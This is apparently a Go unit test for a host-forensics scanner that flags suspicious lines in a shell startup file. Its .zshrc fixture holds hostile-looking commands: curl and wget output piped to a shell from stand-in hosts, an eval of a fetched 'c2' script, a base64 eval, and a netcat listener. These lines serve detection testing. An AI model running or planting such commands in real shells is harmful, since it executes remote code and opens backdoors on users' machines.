package hostforensics

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanShellRC(t *testing.T) {
	home := t.TempDir()
	content := `# Normal stuff
export PATH=$PATH:/usr/local/bin
alias ll="ls -lah"

# Below is suspicious:
curl -fsSL https://example.invalid/install.sh | bash

wget -qO- https://evil.invalid/x.sh | sh

eval "$(base64 -d <<< Zm9v)"

eval "$(curl -s https://evil.invalid/c2)"

nc -l -p 4444

# Comments below MUST NOT match (start with #):
# curl bad.invalid | bash
`
	if err := os.WriteFile(filepath.Join(home, ".zshrc"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	got := scanShellRC(home)
	ids := map[string]int{}
	for _, f := range got {
		ids[f.VulnID]++
	}
	for _, want := range []string{
		"HOST-SHELLRC-CURL-PIPE",
		"HOST-SHELLRC-WGET-PIPE",
		"HOST-SHELLRC-EVAL-BASE64",
		"HOST-SHELLRC-EVAL-CURL",
		"HOST-SHELLRC-NETCAT-LISTENER",
	} {
		if ids[want] == 0 {
			t.Errorf("missing finding %s; got %v", want, ids)
		}
	}
	if ids["HOST-SHELLRC-CURL-PIPE"] > 1 {
		t.Errorf("comment line was matched as curl|bash (count=%d) — comments must be skipped", ids["HOST-SHELLRC-CURL-PIPE"])
	}
}
